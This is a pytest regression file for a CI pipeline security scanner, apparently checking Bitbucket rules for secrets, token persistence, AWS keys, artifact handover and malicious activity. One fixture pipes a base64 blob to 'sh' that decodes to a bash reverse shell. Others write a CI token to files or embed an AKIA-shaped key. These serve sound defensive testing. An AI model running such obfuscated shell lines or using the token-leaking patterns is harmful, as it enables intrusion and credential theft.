"""Regression tests from the rule audit (Bitbucket FP / example fixes)."""
from __future__ import annotations

import yaml

from pipeline_check.core.checks._primitives.dep_verification import (
    is_real_pip_install_line,
)
from pipeline_check.core.checks.bitbucket.rules import (
    bb003_literal_secrets as bb003,
)
from pipeline_check.core.checks.bitbucket.rules import (
    bb005_max_time as bb005,
)
from pipeline_check.core.checks.bitbucket.rules import (
    bb010_pr_artifact_handover as bb010,
)
from pipeline_check.core.checks.bitbucket.rules import (
    bb011_aws_long_lived as bb011,
)
from pipeline_check.core.checks.bitbucket.rules import (
    bb017_token_persistence as bb017,
)
from pipeline_check.core.checks.bitbucket.rules import (
    bb025_malicious_activity as bb025,
)


def _doc(text: str) -> dict:
    return yaml.safe_load(text)


class TestBB003LiteralSecrets:
    def test_exploit_example_strong_check(self):
        # The Vulnerable fragment must fire; it previously put the key
        # under a top-level (unscanned, invalid) ``variables:`` block.
        vuln, safe = bb003.RULE.exploit_example.split("\n\n", 1)
        assert bb003.check("bitbucket-pipelines.yml", yaml.safe_load(vuln)).passed is False
        assert bb003.check("bitbucket-pipelines.yml", yaml.safe_load(safe)).passed is True


class TestBB010PrArtifactHandover:
    def test_trusted_branch_pipeline_not_flagged(self):
        # A branches:/default build->deploy is the trusted release path,
        # not the PR-artifact-handover this CRITICAL rule targets.
        doc = _doc(
            "pipelines:\n"
            "  branches:\n"
            "    main:\n"
            "      - step: {script: [./build.sh], artifacts: [dist/**]}\n"
            "      - step: {deployment: production, script: [./deploy ./dist]}\n"
        )
        assert bb010.check("x.yml", doc).passed is True

    def test_pr_pipeline_unverified_handover_fires(self):
        doc = _doc(
            "pipelines:\n"
            "  pull-requests:\n"
            '    "**":\n'
            "      - step: {script: [./build.sh], artifacts: [dist/**]}\n"
            "      - step: {deployment: staging, script: [./deploy ./dist]}\n"
        )
        assert bb010.check("x.yml", doc).passed is False

    def test_pr_pipeline_with_verification_passes(self):
        doc = _doc(
            "pipelines:\n"
            "  pull-requests:\n"
            '    "**":\n'
            "      - step: {script: [./build.sh], artifacts: [dist/**]}\n"
            "      - step:\n"
            "          deployment: staging\n"
            "          script:\n"
            "            - sha256sum -c dist/manifest.sha256\n"
            "            - ./deploy ./dist\n"
        )
        assert bb010.check("x.yml", doc).passed is True


class TestBB017TokenPersistence:
    def test_curl_output_redirect_not_flagged(self):
        # The redirect saves curl's RESPONSE, not the token; the token is
        # only used inline in the auth header. This is the safe idiom.
        doc = _doc(
            "pipelines:\n"
            "  default:\n"
            "    - step:\n"
            "        script:\n"
            "          - 'curl -H \"Authorization: Bearer $BITBUCKET_TOKEN\""
            " https://api.bitbucket.org/2.0/repositories > repos.json'\n"
        )
        assert bb017.check("x.yml", doc).passed is True

    def test_token_written_to_file_fires(self):
        doc = _doc(
            "pipelines:\n"
            "  default:\n"
            "    - step:\n"
            "        script:\n"
            "          - 'echo \"TOKEN=$BITBUCKET_TOKEN\" >> .env'\n"
        )
        assert bb017.check("x.yml", doc).passed is False

    def test_token_piped_to_tee_fires(self):
        doc = _doc(
            "pipelines:\n"
            "  default:\n"
            "    - step:\n"
            "        script:\n"
            "          - 'echo \"$BITBUCKET_TOKEN\" | tee creds.txt'\n"
        )
        assert bb017.check("x.yml", doc).passed is False

    def test_exploit_example_strong_check(self):
        # Vuln uses BITBUCKET_TOKEN (matches _TOKEN_PERSIST_RE); safe uses
        # the token inline in a curl header so the redirect saves the
        # API response, not the token itself.
        vuln, safe = bb017.RULE.exploit_example.split("\n\n", 1)
        assert bb017.check("bitbucket-pipelines.yml", yaml.safe_load(vuln)).passed is False
        assert bb017.check("bitbucket-pipelines.yml", yaml.safe_load(safe)).passed is True


class TestBB011AwsLongLived:
    def test_exploit_example_strong_check(self):
        # Vuln fragment embeds an AKIA-shaped key that aws_key_in detects;
        # safe uses OIDC (no static key in the pipeline file).
        vuln, safe = bb011.RULE.exploit_example.split("\n\n", 1)
        assert bb011.check("bitbucket-pipelines.yml", yaml.safe_load(vuln)).passed is False
        assert bb011.check("bitbucket-pipelines.yml", yaml.safe_load(safe)).passed is True

    def test_akia_key_in_script_fires(self):
        # Sanity check: any AKIA-shaped key in a script line triggers the rule.
        doc = _doc(
            "pipelines:\n"
            "  default:\n"
            "    - step:\n"
            "        script:\n"
            "          - export AWS_ACCESS_KEY_ID=AKIAZ3MHALF2TESTHIJK\n"
        )
        assert bb011.check("x.yml", doc).passed is False

    def test_oidc_pipe_passes(self):
        doc = _doc(
            "pipelines:\n"
            "  default:\n"
            "    - step:\n"
            "        oidc: true\n"
            "        script:\n"
            "          - pipe: atlassian/aws-s3-deploy:1.7.0\n"
            "            variables:\n"
            "              AWS_OIDC_ROLE_ARN: arn:aws:iam::123456789012:role/ci\n"
        )
        assert bb011.check("x.yml", doc).passed is True


class TestBB025MaliciousActivity:
    def test_exploit_example_strong_check(self):
        # Vuln fires on both the base64-decoded pipe to shell (30+ char blob)
        # and the webhook.site exfil line; safe runs only `make build`.
        vuln, safe = bb025.RULE.exploit_example.split("\n\n", 1)
        assert bb025.check("bitbucket-pipelines.yml", yaml.safe_load(vuln)).passed is False
        assert bb025.check("bitbucket-pipelines.yml", yaml.safe_load(safe)).passed is True

    def test_base64_blob_fires_independently(self):
        # The base64 line alone (30+ char blob) is enough to trip the
        # obfuscated-exec detector without the webhook.site line.
        doc = _doc(
            "pipelines:\n"
            "  default:\n"
            "    - step:\n"
            "        script:\n"
            "          - echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | sh\n"
        )
        assert bb025.check("x.yml", doc).passed is False

    def test_short_base64_blob_does_not_fire(self):
        # A blob shorter than 30 chars is not matched; benign base64 use
        # (log formatting, test fixtures) should not produce findings.
        doc = _doc(
            "pipelines:\n"
            "  default:\n"
            "    - step:\n"
            "        script:\n"
            "          - echo Z2g6Li4uIA== | base64 -d | sh\n"
        )
        assert bb025.check("x.yml", doc).passed is True


class TestBB031QuotedToolingPackage:
    """BB-031 / shared primitive — quoted package tokens must respect the
    tooling allowlist the same as unquoted tokens."""

    def test_quoted_tooling_pkg_is_exempt(self):
        # "ruff==0.1.0" (shell-quoted) was previously mis-classified as a
        # real install because the leading quote prevented allowlist lookup.
        assert is_real_pip_install_line('pip install "ruff==0.1.0"') is False

    def test_quoted_tooling_pkg_single_quote_is_exempt(self):
        assert is_real_pip_install_line("pip install 'ruff==0.1.0'") is False

    def test_unquoted_tooling_pkg_still_exempt(self):
        # Regression guard: the existing unquoted path must not be broken.
        assert is_real_pip_install_line("pip install ruff==0.1.0") is False

    def test_real_install_without_hashes_still_fires(self):
        # A genuine runtime dep (requests) must always be flagged.
        assert is_real_pip_install_line("pip install requests") is True

    def test_quoted_real_pkg_fires(self):
        # Even when shell-quoted, a non-tooling package is still real.
        assert is_real_pip_install_line('pip install "requests==2.31.0"') is True


class TestBB005GlobalMaxTime:
    """BB-005 — global options.max-time satisfies the control."""

    def test_global_options_max_time_passes(self):
        # A pipeline that sets options.max-time globally is bounded even
        # though individual steps omit a per-step max-time.
        doc = _doc(
            "options:\n"
            "  max-time: 30\n"
            "pipelines:\n"
            "  default:\n"
            "    - step:\n"
            "        script: [./build.sh]\n"
        )
        assert bb005.check("x.yml", doc).passed is True

    def test_per_step_max_time_alone_passes(self):
        doc = _doc(
            "pipelines:\n"
            "  default:\n"
            "    - step:\n"
            "        max-time: 15\n"
            "        script: [./build.sh]\n"
        )
        assert bb005.check("x.yml", doc).passed is True

    def test_no_max_time_anywhere_fires(self):
        # Neither global options.max-time nor a per-step value — must fire.
        doc = _doc(
            "pipelines:\n"
            "  default:\n"
            "    - step:\n"
            "        script: [./build.sh]\n"
        )
        assert bb005.check("x.yml", doc).passed is False

    def test_global_max_time_with_multiple_steps_passes(self):
        doc = _doc(
            "options:\n"
            "  max-time: 60\n"
            "pipelines:\n"
            "  default:\n"
            "    - step:\n"
            "        script: [./step1.sh]\n"
            "    - step:\n"
            "        script: [./step2.sh]\n"
        )
        assert bb005.check("x.yml", doc).passed is True
